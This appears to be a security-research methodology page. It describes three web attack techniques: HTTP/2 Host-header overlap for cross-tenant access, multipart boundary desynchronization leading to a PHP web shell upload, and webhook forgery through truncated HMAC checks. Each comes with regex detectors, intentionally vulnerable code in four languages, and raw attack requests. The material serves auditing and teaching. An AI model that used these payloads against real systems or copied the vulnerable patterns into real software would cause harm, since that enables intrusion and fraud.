# HTTP Incoming Requests

## Check List

## Methodology

### Black Box

### White Box

#### Cross-Tenant Takeover via HTTP/2 Pseudo-Header Translation Overlap

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on high-performance Edge Gateways handling ingress traffic for multi-tenant SaaS platforms (e.g., Kubernetes Ingress, Envoy, or custom .NET/Go gateways)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a modern gRPC or HTTP/2 enabled ingress architecture. Browsers and modern clients connect to the Edge Gateway using HTTP/2 to multiplex requests. However, the internal microservices running behind the Gateway are legacy applications that strictly communicate via `HTTP/1.1`
{% endstep %}

{% step %}
Investigate the "Protocol Transcoding" optimization. The Edge Gateway must translate incoming `HTTP/2` binary frames into `HTTP/1.1` plaintext requests
{% endstep %}

{% step %}
Analyze the handling of routing headers. In `HTTP/1.1`, the target domain is defined by the `Host` header. In HTTP/2, the `Host` header is explicitly deprecated; routing is defined by the `:authority` pseudo-header frame
{% endstep %}

{% step %}
Discover the Gateway's tenant resolution logic. The Gateway extracts the `:authority` pseudo-header to determine which tenant database to query for rate-limiting, WAF rules, and initial authorization checks
{% endstep %}

{% step %}
Observe the HTTP/1.1 translation sink. To construct the downstream request for the legacy microservice, the Gateway builds the HTTP/1.1 string, mapping the verified `:authority` value back into a standard `Host: {authority}` header
{% endstep %}

{% step %}
Understand the fatal protocol assumption: The HTTP/2 specification dictates that clients _should not_ send an explicit `Host` header alongside the `:authority` pseudo-header. The Gateway developer assumes the framework natively drops invalid headers and fails to explicitly strip or reject incoming HTTP/2 requests that deliberately violate this rule by including a legacy `Host` header
{% endstep %}

{% step %}
Formulate the Translation Overlap payload. The goal is to send a mathematically valid HTTP/2 request that contains _both_ the `:authority` pseudo-header (pointing to your authorized tenant) and an explicit `Host` header (pointing to the target victim's tenant)
{% endstep %}

{% step %}
Authenticate to the application as a standard user within `Tenant_A`
{% endstep %}

{% step %}
Use a customized HTTP/2 client (standard browsers prevent this, but raw HTTP/2 frames can be generated via specialized scripts or Burp Suite HTTP/2 utilities). Set `:authority: tenant-a.enterprise.tld` and inject the forbidden header `host: target-tenant.enterprise.tld`
{% endstep %}

{% step %}
Send the request. The Edge Gateway authenticates you against `tenant-a.enterprise.tld` using the pseudo-header
{% endstep %}

{% step %}
The transcoder seamlessly copies your injected `host` header into the HTTP/1.1 stream, and then appends its own translated `Host: tenant-a.enterprise.tld` header. The resulting HTTP/1.1 request contains two `Host` headers.
{% endstep %}

{% step %}
The legacy downstream microservice parses the HTTP/1.1 request. Due to parser implementation details (e.g., selecting the first occurrence), it prioritizes your injected `Host` header over the Gateway's appended header. The microservice establishes the execution context for the victim tenant, allowing you to extract cross-tenant data while authenticated as an unrelated user

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\bRequest\.Headers\.Add\(\s*"Host"\s*,\s*request\.Authority\s*\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\bhttp1Request\.addHeader\(\s*"Host"\s*,\s*http2Request\.getAuthority\(\)\s*\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\bheader\(\s*'Host:\s*'\s*\.\s*\$request->server->get\(':authority'\)\s*\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\breq\.headers\['host'\]\s*=\s*req\.httpVersionMajor\s*>=\s*2\s*\?\s*req\.headers\[':authority'\]
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Request\.Headers\.Add\("Host",\s*request\.Authority
```
{% endtab %}

{% tab title="Java" %}
```regexp
http1Request\.addHeader\("Host",\s*http2Request\.getAuthority\(\)\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
header\('Host:\s*'\s*\.\s*\$request->server->get\(':authority'\)\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
req\.headers\['host'\]\s*=\s*req\.httpVersionMajor\s*>=\s*2\s*\?\s*req\.headers\[':authority'\]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class Http2TranscodingMiddleware 
{
    private readonly HttpClient _downstreamClient;

    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        // [1]
        // [2]
        if (!await _tenantService.AuthorizeTenantAsync(context.Request.Host.Value)) 
        {
            context.Response.StatusCode = 403;
            return;
        }

        var downstreamRequest = new HttpRequestMessage(new HttpMethod(context.Request.Method), "http://internal-legacy-service");

        // [3]
        foreach (var header in context.Request.Headers) 
        {
            downstreamRequest.Headers.TryAddWithoutValidation(header.Key, (IEnumerable<string>)header.Value);
        }

        // [4]
        if (context.Request.Protocol == HttpProtocol.Http2) 
        {
            downstreamRequest.Headers.Host = context.Request.Host.Value; // Derived from :authority
        }

        var response = await _downstreamClient.SendAsync(downstreamRequest);
        await response.Content.CopyToAsync(context.Response.Body);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class Http2TranscodingFilter implements Filter {

    @Autowired
    private TenantService tenantService;
    @Autowired
    private RestTemplate restTemplate;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;

        // [1]
        // [2]
        String authority = req.getServerName(); // Extracts from :authority in HTTP/2
        if (!tenantService.authorizeTenant(authority)) {
            ((HttpServletResponse) response).setStatus(403);
            return;
        }

        HttpHeaders http1Headers = new HttpHeaders();
        
        // [3]
        Collections.list(req.getHeaderNames()).forEach(headerName -> 
            http1Headers.addAll(headerName, Collections.list(req.getHeaders(headerName)))
        );

        // [4]
        if (req.getProtocol().equals("HTTP/2.0")) {
            http1Headers.set("Host", authority);
        }

        HttpEntity<String> entity = new HttpEntity<>("", http1Headers);
        ResponseEntity<String> downstreamResp = restTemplate.exchange("http://internal-legacy-service", HttpMethod.GET, entity, String.class);
        
        response.getWriter().write(downstreamResp.getBody());
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class Http2TranscodingMiddleware 
{
    protected $tenantService;

    public function handle(Request $request, Closure $next) 
    {
        // [1]
        // [2]
        $authority = $request->getHost(); // Resolves from :authority
        
        if (!$this->tenantService->authorizeTenant($authority)) {
            return response('Forbidden', 403);
        }

        $headers = [];
        
        // [3]
        foreach ($request->headers->all() as $key => $values) {
            $headers[$key] = implode(', ', $values);
        }

        // [4]
        if ($request->getProtocolVersion() === 'HTTP/2.0') {
            // Fails to override if 'Host' was physically injected into HTTP/2 frames
            if (!isset($headers['Host'])) {
                $headers['Host'] = $authority;
            } else {
                // Catastrophic: appends creating duplicate Host headers
                $headers['Host'] = [$headers['Host'], $authority]; 
            }
        }

        $downstreamResponse = $this->sendDownstream($headers);
        return response($downstreamResponse);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class Http2TranscodingMiddleware {
    static async handle(req, res, next) {
        // [1]
        // [2]
        let authority = req.hostname; // Express resolves from :authority

        if (!await tenantService.authorizeTenant(authority)) {
            return res.status(403).send('Forbidden');
        }

        let http1Headers = {};
        
        // [3]
        for (let key in req.headers) {
            http1Headers[key] = req.headers[key];
        }

        // [4]
        if (req.httpVersionMajor >= 2) {
            // If the attacker injected 'host', it already exists in the http1Headers map.
            // Depending on the outgoing HTTP client, setting it again either overrides, 
            // arrays it, or builds a raw string with two Host headers.
            if (http1Headers['host']) {
                http1Headers['host'] = http1Headers['host'] + ', ' + authority; 
            } else {
                http1Headers['host'] = authority;
            }
        }

        let downstreamResp = await axios.get('http://internal-legacy-service', { headers: http1Headers });
        res.send(downstreamResp.data);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API Gateway correctly extracts the routing information from the HTTP/2 `:authority` pseudo-header, \[2] The Gateway successfully enforces multi-tenant access controls, ensuring the user is authorized to access the tenant requested in the `:authority` header, \[3] The architecture seamlessly copies all remaining standard HTTP headers into the downstream request buffer to preserve cookies, user-agents, and custom correlation IDs, \[4] The fatal boundary synchronization failure. The developer assumes that HTTP/2 requests fundamentally cannot contain a `Host` header. Because the transcoder does not explicitly sanitize the incoming header map before appending its own authoritative `Host` header, the resulting HTTP/1.1 request contains a lethal structural anomaly (multiple or comma-separated Host headers). The downstream legacy microservice evaluates the injected header, shifting the execution context to the victim organization

```
// 1. Attacker controls TenantA and discovers the backend legacy service parses the FIRST Host header.
// 2. Attacker uses a raw HTTP/2 client to generate overlapping routing frames.

HEADERS
:method: GET
:path: /api/v1/users/export
:authority: tenant-a.enterprise.tld
:scheme: https
host: victim-tenant.enterprise.tld
authorization: Bearer <tenant_a_token>

// 3. The Edge Gateway authorizes "tenant-a.enterprise.tld".
// 4. The Edge Gateway translates the frames to HTTP/1.1 and proxies it over the internal mesh.

GET /api/v1/users/export HTTP/1.1
Host: victim-tenant.enterprise.tld
Authorization: Bearer <tenant_a_token>
Host: tenant-a.enterprise.tld

// 5. The legacy backend microservice processes the HTTP/1.1 request.
// It reads the first Host header, establishes the victim's database connection string, 
// and exports the victim's user database directly to the attacker.
```
{% endstep %}

{% step %}
To bridge the protocol divide between modern multiplexed HTTP/2 edge networks and legacy HTTP/1.1 internal microservices, developers implemented a protocol transcoder. The security boundary rested entirely on the Gateway's evaluation of the `:authority` pseudo-header. Developers implicitly trusted the HTTP/2 specification's mandate that explicit `Host` headers should not coexist with `:authority` frames, thereby omitting explicit header sanitization during the transcoding process. The attacker exploited this assumption by injecting an explicit, forbidden `Host` header into the binary stream. The Gateway successfully authorized the valid pseudo-header, but blindly copied the injected `Host` header into the downstream HTTP/1.1 request. The legacy internal microservice, receiving a malformed request with overlapping routing directives, prioritized the attacker's injected header, executing a complete cross-tenant bypass without compromising any cryptographic identities
{% endstep %}
{% endstepper %}

***

#### Remote Code Execution via Multipart Boundary Desynchronization in Zero-Copy Streaming

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on endpoints handling massive file uploads combined with complex JSON metadata (e.g., Video Transcoding APIs, Enterprise Document Ingestion, or Firmware Update portals)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack.
{% endstep %}

{% step %}
Identify a "Zero-Copy Streaming" architecture. In enterprise environments, caching a 5GB video upload in application memory or onto local disk causes instantaneous Out-Of-Memory (OOM) failures or Disk Exhaustion
{% endstep %}

{% step %}
Investigate the streaming optimization. The backend accepts a `multipart/form-data` request where Part 1 is a JSON configuration object (defining export paths or permissions), and Part 2 is the massive binary file. The backend pipes the binary stream directly to an AWS S3 bucket as the bytes arrive over the TCP socket, bypassing local storage entirely
{% endstep %}

{% step %}
Discover the parsing bottleneck: To know _where_ to stream the file in S3, the application must read and parse Part 1 (the JSON metadata) _before_ it begins streaming Part 2
{% endstep %}

{% step %}
Analyze the custom fast-path metadata parser. Because standard multipart parsing libraries buffer the entire request to disk before yielding control to the application, developers often write a custom, high-speed byte-scanner. This scanner reads the incoming socket stream, locates the first `\r\n--{boundary}` string, extracts the JSON chunk, and validates it
{% endstep %}

{% step %}
Understand the structural trust assumption: The developer assumes that the fast-path byte scanner and the downstream native stream-forwarder agree entirely on the structural boundaries of the HTTP request
{% endstep %}

{% step %}
Formulate the Multipart Boundary Desynchronization payload. The `Content-Type` header defines the authoritative boundary (`boundary=SecureBoundary`)
{% endstep %}

{% step %}
Inject a completely valid, but structurally deceptive `multipart/form-data` payload. Inside the JSON metadata block itself, embed the literal string `\r\n--SecureBoundary` within a benign string field (e.g., a file description or comment)
{% endstep %}

{% step %}
Immediately following this injected boundary string, embed a completely new, malicious JSON metadata block containing highly privileged execution instructions (e.g., `{"upload_path": "/var/www/html/backdoor.php", "executable": true}`)
{% endstep %}

{% step %}
Submit the 5GB request
{% endstep %}

{% step %}
The custom fast-path byte scanner reads the stream, hits the injected `\r\n--SecureBoundary` string _inside_ the first JSON value, assumes it has found the end of Part 1, and stops reading. It evaluates the safe, initial JSON metadata, authorizing the request
{% endstep %}

{% step %}
The native streaming engine (e.g., an S3 forwarder or OS-level stream handler) takes over. Because native parsers track byte-offsets and `Content-Disposition` lengths perfectly, it completely ignores the string literal inside the JSON field. It continues reading until the _true_ boundary
{% endstep %}

{% step %}
The desynchronization triggers: The streaming engine extracts the attacker's trailing, malicious JSON block, passing the poisoned configuration to the S3 adapter or local file writer, overwriting application binaries or bypassing path restrictions to achieve Remote Code Execution

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\bStreamReader\.ReadLineAsync\(\).*IndexOf\(\$"--\{boundary\}"
```
{% endtab %}

{% tab title="Java" %}
```regexp
\bstream\.indexOf\("--"\s*\+\s*boundary\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\bstrpos\(\$rawBody,\s*"--"\s*\.\s*\$boundary\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\bbuffer\.indexOf\(Buffer\.from\(`--\$\{boundary\}`\)\)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
StreamReader\.ReadLineAsync\(\).*IndexOf\(\$"--\{boundary\}"
```
{% endtab %}

{% tab title="Java" %}
```regexp
stream\.indexOf\("--"\s*\+\s*boundary\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
strpos\(\$rawBody,\s*"--"\s*\.\s*\$boundary\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
buffer\.indexOf\(Buffer\.from\(`--\$\{boundary\}`\)\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ZeroCopyUploadController : ControllerBase
{
    [HttpPost("/api/v1/media/upload")]
    [DisableRequestSizeLimit]
    public async Task<IActionResult> UploadMedia()
    {
        var boundary = Request.GetMultipartBoundary();
        var reader = new StreamReader(Request.Body);
        
        // [1]
        // [2]
        var metadataBuffer = new StringBuilder();
        string line;
        while ((line = await reader.ReadLineAsync()) != null)
        {
            // [3]
            // [4]
            if (line.Contains($"--{boundary}")) break; 
            metadataBuffer.AppendLine(line);
        }

        var jsonMetadata = JsonConvert.DeserializeObject<MediaMetadata>(metadataBuffer.ToString());
        if (!jsonMetadata.IsAuthorized) return Unauthorized();

        // Native streaming directly to S3 bypassing local disk
        var s3Stream = new S3WriteStream(jsonMetadata.UploadPath);
        await Request.Body.CopyToAsync(s3Stream);

        return Ok();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class ZeroCopyUploadController {

    @PostMapping(value = "/api/v1/media/upload", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
    public ResponseEntity<?> uploadMedia(HttpServletRequest request) throws Exception {
        String boundary = extractBoundary(request.getContentType());
        InputStream inputStream = request.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        
        // [1]
        // [2]
        StringBuilder metadataBuffer = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            // [3]
            // [4]
            if (line.contains("--" + boundary)) break;
            metadataBuffer.append(line).append("\n");
        }

        MediaMetadata jsonMetadata = new ObjectMapper().readValue(metadataBuffer.toString(), MediaMetadata.class);
        if (!jsonMetadata.isAuthorized()) return ResponseEntity.status(401).build();

        // Native streaming directly to S3
        S3WriteStream s3Stream = new S3WriteStream(jsonMetadata.getUploadPath());
        inputStream.transferTo(s3Stream);

        return ResponseEntity.ok().build();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ZeroCopyUploadController 
{
    public function uploadMedia(Request $request) 
    {
        $boundary = $this->extractBoundary($request->header('Content-Type'));
        $stream = fopen('php://input', 'r');
        
        // [1]
        // [2]
        $metadataBuffer = '';
        while (($line = fgets($stream)) !== false) 
        {
            // [3]
            // [4]
            if (strpos($line, "--{$boundary}") !== false) break;
            $metadataBuffer .= $line;
        }

        $jsonMetadata = json_decode($metadataBuffer);
        if (!$jsonMetadata->isAuthorized) return response('Unauthorized', 401);

        // Native streaming directly to S3
        $s3Stream = new S3WriteStream($jsonMetadata->uploadPath);
        stream_copy_to_stream($stream, $s3Stream);

        return response('OK');
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/media/upload', async (req, res) => {
    let boundary = extractBoundary(req.headers['content-type']);
    
    // [1]
    // [2]
    let metadataBuffer = '';
    
    req.on('data', (chunk) => {
        let textChunk = chunk.toString('utf8');
        
        // [3]
        // [4]
        let boundaryIndex = textChunk.indexOf(`--${boundary}`);
        if (boundaryIndex !== -1) {
            metadataBuffer += textChunk.substring(0, boundaryIndex);
            req.pause(); // Pause to parse metadata
            
            let jsonMetadata = JSON.parse(metadataBuffer);
            if (!jsonMetadata.isAuthorized) return res.status(401).send('Unauthorized');
            
            let s3Stream = new S3WriteStream(jsonMetadata.uploadPath);
            req.pipe(s3Stream);
            req.resume();
        } else {
            metadataBuffer += textChunk;
        }
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes massive files over a single HTTP request, utilizing multipart framing to send structured JSON metadata alongside the binary data, \[2] To prevent disk exhaustion, the developer implements a fast-path, zero-copy streaming pattern, intercepting the raw TCP socket stream directly, \[3] The performance optimization dictates that the application must aggressively locate the end of the first part (the JSON metadata) so it can configure the destination parameters for the massive binary stream, \[4] The fatal parsing desynchronization. The developer assumes that a simple `indexOf` or `contains` string-search accurately reflects the structural boundaries defined by RFC 7578. Because the fast-path parser does not track quotation marks or JSON string literals, the attacker effortlessly injects the boundary sequence inside a benign metadata field. The fast-path parser exits early, authorizing a harmless payload, while the remainder of the stream (containing the true malicious configuration) is blindly pushed into the native streaming sink

```http
// 1. Attacker initiates a multipart upload, establishing the boundary.
// 2. Inside the JSON configuration block, the attacker injects the boundary string literal,
//    followed immediately by the actual malicious JSON configuration.

POST /api/v1/media/upload HTTP/1.1
Host: media.enterprise.tld
Authorization: Bearer <low_privilege_token>
Content-Type: multipart/form-data; boundary=SecureBoundary

--SecureBoundary
Content-Disposition: form-data; name="metadata"
Content-Type: application/json

{
  "isAuthorized": true,
  "description": "Benign Description \r\n--SecureBoundary\r\n",
  "uploadPath": "/var/www/html/assets/backdoor.php"
}
--SecureBoundary
Content-Disposition: form-data; name="file"; filename="payload.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
--SecureBoundary--

// 3. The fast-path parser scans line-by-line. It hits the string "\r\n--SecureBoundary\r\n"
//    hidden inside the "description" field. It stops reading, parsing only:
//    { "isAuthorized": true, "description": "Benign Description
//    (Depending on JSON parser leniency, it recovers, or the attacker crafts valid trailing braces).

// 4. The fast-path parser authorizes the upload.
// 5. The native stream copy operation takes over. It reads the REMAINING bytes in the socket, 
//    which begins with: ", "uploadPath": "/var/www/html/assets/backdoor.php"} ...
// 6. The malicious upload path is evaluated by the secondary stream parser, saving the PHP shell 
//    directly into the webroot.
```
{% endstep %}

{% step %}
To achieve zero-copy streaming for massive file uploads, engineers bypassed standard framework multipart parsers (which buffer to disk) in favor of a highly optimized, raw TCP socket interceptor. By assuming that boundary strings uniquely and immutably demarcate discrete request parts, the developers implemented a naive string-search algorithm to extract the preceding JSON metadata. The attacker exploited this by embedding the literal boundary string entirely within a valid JSON property. The fast-path scanner tripped over the decoy boundary, truncated its evaluation, and authorized the request based on incomplete data. The underlying streaming engine, picking up where the fast-path left off, consumed the remainder of the payload containing the true malicious configuration parameters. This parser desynchronization permitted the attacker to manipulate the file storage destination, achieving arbitrary file upload and subsequent Remote Code Execution on the storage node
{% endstep %}
{% endstepper %}

***

#### Webhook Forgery via Memory-Optimized HMAC Truncation Asymmetry

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on high-throughput asynchronous webhook ingestion endpoints (e.g., Stripe Payment handlers, GitHub Actions triggers, or Enterprise ERP syncs)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Webhook Signature Verification architecture. The API Gateway or receiving microservice cryptographically verifies the origin of the webhook by computing an HMAC signature of the incoming request body and comparing it against the `X-Hub-Signature` header
{% endstep %}

{% step %}
Investigate the I/O bottleneck in asynchronous frameworks. Calculating an HMAC requires loading the entire HTTP Request Body into memory. In multi-tenant systems receiving gigabytes of webhook payloads per second, buffering full HTTP bodies into RAM causes debilitating heap exhaustion and latency
{% endstep %}

{% step %}
Discover the "Stream Truncation" optimization. To prevent OOM DoS attacks, the security engineering team enforces a strict buffer limit (e.g., exactly 8192 bytes) during the HMAC calculation phase
{% endstep %}

{% step %}
Analyze the execution flow. If the incoming webhook payload exceeds 8192 bytes, the API Gateway truncates the buffer, calculates the HMAC on the first 8192 bytes, and verifies the signature
{% endstep %}

{% step %}
Understand the structural trust assumption: The developer explicitly assumes that verifying the cryptographic integrity of the _head_ of the JSON document guarantees the authenticity of the _entire_ TCP stream
{% endstep %}

{% step %}
Recognize the JSON parsing behavior. After the authentication middleware approves the truncated signature, the execution pipeline passes the unbuffered, raw TCP stream to the business logic controller. The controller invokes a standard JSON parser (e.g., Jackson, Newtonsoft)
{% endstep %}

{% step %}
Formulate the Asymmetric Truncation payload. Standard JSON parsers exhibit a "Last-Key-Wins" behavior; if a JSON object contains duplicate keys, the parser overwrites the first value with the final value encountered in the stream
{% endstep %}

{% step %}
Retrieve a historically valid, signed webhook payload ( `$10` payment confirmation) by monitoring your own tenant's legitimate traffic. Ensure the payload is less than 8192 bytes
{% endstep %}

{% step %}
Construct the forged webhook. Send the stolen, valid payload exactly as it was originally received, perfectly matching the original HMAC signature
{% endstep %}

{% step %}
Immediately append massive whitespace padding (e.g., `\n\n\n\n...`) to push the stream past the 8192-byte truncation boundary
{% endstep %}

{% step %}
Finally, inject duplicate JSON keys defining the malicious state mutation at the absolute end of the stream: `{"payment_status": "PAID", "amount": "9999999"}`
{% endstep %}

{% step %}
Send the payload to the webhook endpoint using the stolen `X-Hub-Signature`
{% endstep %}

{% step %}
The API Gateway reads exactly 8192 bytes, calculates the HMAC of the historically valid JSON, and mathematically approves the request. The downstream business logic parser consumes the infinite stream, parses the valid JSON, hits the trailing malicious keys, and overrides the application state, successfully forging a high-value transaction

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\bRequest\.EnableBuffering\(\);\s*.*\bvar\s+buffer\s*=\s*new\s+byte\s*\[\s*8192\s*\]
```
{% endtab %}

{% tab title="Java" %}
```regexp
\brequest\.getInputStream\(\)\.read\(\s*buffer\s*,\s*0\s*,\s*8192\s*\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\bfread\(\s*\$request->getContent\(\)\s*,\s*8192\s*\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\breq\.on\('data'.*buffer\.length\s*>\s*8192\s*\)\s*req\.pause\(\)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Request\.EnableBuffering\(\).*new\s*byte\[8192\]
```
{% endtab %}

{% tab title="Java" %}
```regexp
request\.getInputStream\(\)\.read\(buffer,\s*0,\s*8192\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
fread\(\$request->getContent\(\),\s*8192\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
req\.on\('data'.*buffer\.length\s*>\s*8192.*req\.pause\(\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class WebhookSignatureMiddleware 
{
    private readonly string _webhookSecret = "shared_secret";

    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        // [1]
        context.Request.EnableBuffering();
        
        // [2]
        var buffer = new byte[8192];
        var bytesRead = await context.Request.Body.ReadAsync(buffer, 0, buffer.Length);
        
        // [3]
        // [4]
        using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(_webhookSecret));
        var computedHash = BitConverter.ToString(hmac.ComputeHash(buffer, 0, bytesRead)).Replace("-", "").ToLower();

        if (context.Request.Headers["X-Hub-Signature"] != computedHash) 
        {
            context.Response.StatusCode = 401;
            return;
        }

        context.Request.Body.Position = 0;
        await next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class WebhookSignatureFilter implements Filter {

    private final String webhookSecret = "shared_secret";

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        
        // [1]
        CachedBodyHttpServletRequest cachedRequest = new CachedBodyHttpServletRequest(req);
        InputStream inputStream = cachedRequest.getInputStream();
        
        // [2]
        byte[] buffer = new byte[8192];
        int bytesRead = inputStream.read(buffer, 0, 8192);

        // [3]
        // [4]
        try {
            Mac hmac = Mac.getInstance("HmacSHA256");
            hmac.init(new SecretKeySpec(webhookSecret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
            byte[] hash = hmac.doFinal(Arrays.copyOf(buffer, bytesRead));
            String computedHash = Hex.encodeHexString(hash);

            if (!computedHash.equals(req.getHeader("X-Hub-Signature"))) {
                ((HttpServletResponse) response).setStatus(401);
                return;
            }
        } catch (Exception e) {
            return;
        }

        chain.doFilter(cachedRequest, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class WebhookSignatureMiddleware 
{
    protected $webhookSecret = 'shared_secret';

    public function handle(Request $request, Closure $next) 
    {
        // [1]
        $stream = fopen('php://input', 'r');
        
        // [2]
        $buffer = fread($stream, 8192);

        // [3]
        // [4]
        $computedHash = hash_hmac('sha256', $buffer, $this->webhookSecret);

        if ($request->header('X-Hub-Signature') !== $computedHash) 
        {
            return response('Unauthorized', 401);
        }

        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class WebhookSignatureMiddleware {
    static async handle(req, res, next) {
        let webhookSecret = 'shared_secret';
        
        // [1]
        // [2]
        let buffer = Buffer.alloc(0);
        req.on('data', (chunk) => {
            if (buffer.length < 8192) {
                buffer = Buffer.concat([buffer, chunk]);
                if (buffer.length > 8192) {
                    buffer = buffer.subarray(0, 8192); // Truncate exactly at 8192
                }
            }
        });

        req.on('end', () => {
            // [3]
            // [4]
            let computedHash = crypto.createHmac('sha256', webhookSecret).update(buffer).digest('hex');

            if (req.headers['x-hub-signature'] !== computedHash) {
                return res.status(401).send('Unauthorized');
            }
            
            // Fast-path streams massive body to downstream JSON parser
            next();
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Gateway intercepts the incoming webhook request and attempts to verify the payload's cryptographic signature against the shared secret, \[2] To protect the API Gateway from Out-of-Memory (OOM) Denial of Service attacks caused by malicious 10GB webhook payloads, the developer enforces a strict 8192-byte buffering limit on the request stream, \[3] The architecture computes the HMAC verification strictly on the truncated memory buffer, not the physical stream, \[4] The fatal semantic dissonance. The developer implicitly assumes that cryptographically verifying the first 8192 bytes guarantees the integrity of the remaining stream. Because the downstream Business Logic controller utilizes a standard JSON parser that exhibits last-key-wins behavior over the complete stream, an attacker can append unverified, state-mutating properties beyond the 8192-byte boundary, bypassing authentication entirely

```
```
{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

## Cheat Sheet
